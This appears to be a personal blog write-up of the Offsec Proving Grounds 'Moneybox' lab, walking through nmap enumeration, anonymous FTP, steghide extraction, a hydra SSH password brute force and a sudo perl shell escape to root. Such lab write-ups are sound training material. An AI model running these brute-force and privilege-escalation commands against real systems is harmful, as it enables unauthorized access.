---
title: "Proving grounds Play: Moneybox"
layout: post
date: 2023-09-12 01:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.153
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1e30ce7281e0a23d5c28888b12acfaac (RSA)
|   256 019dfafbf20637c012fc018b248f53ae (ECDSA)
|_  256 2f34b3d074b47f8d17d237b12e32f7eb (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: MoneyBox
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Fuzzing: Directories

```text
/blogs
```

### Landing page

![img](/assets/images/CTF/Proving_Grounds/Moneybox/web1.png)

View-source disclosed a hint about the secret directory 

```html
<!--the hint is the another secret directory is S3cr3t-T3xt-->
```

The secret directory source disclosed a secret key `<!..Secret Key 3xtr4ctd4t4 >`.

## FTP

FTP allows anonymous login.

![img](/assets/images/CTF/Proving_Grounds/Moneybox/ftp.png)

Download the image file and use the secretkey found earlier as password to extract information.

```sh
steghide extract -sf trytofind.jpg
```

![img](/assets/images/CTF/Proving_Grounds/Moneybox/steghide.png)

A file names data.txt has been written to the same directory, that contains hint about the user and password.

```text
Hello.....  renu

      I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
```

## Crack SSH credentials using hydra

```sh
hydra -l renu -P /usr/share/wordlists/rockyou.txt 192.168.180.230 -t 4 ssh
```

![img](/assets/images/CTF/Proving_Grounds/Moneybox/ssh-crack.png)

SSH to user `renu` using the password.

**Initial Foothold obtained**

![img](/assets/images/CTF/Proving_Grounds/Moneybox/renu-dir.png)

After searching the directoriees in renu user ,an another user was found in the `/home` directory `lily`.

The user lily has a SSH authorized key which belongs to the user renu, SSH to user lily from user renu.

![img](/assets/images/CTF/Proving_Grounds/Moneybox/lily.png)

## Enumerate user permission

```sh
sudo -l
```

![img](/assets/images/CTF/Proving_Grounds/Moneybox/sudo-l.png)

## Privilege Escalation

### Sudo

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```sh
sudo perl -e 'exec "/bin/sh";'
```

![img](/assets/images/CTF/Proving_Grounds/Moneybox/root.png)

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).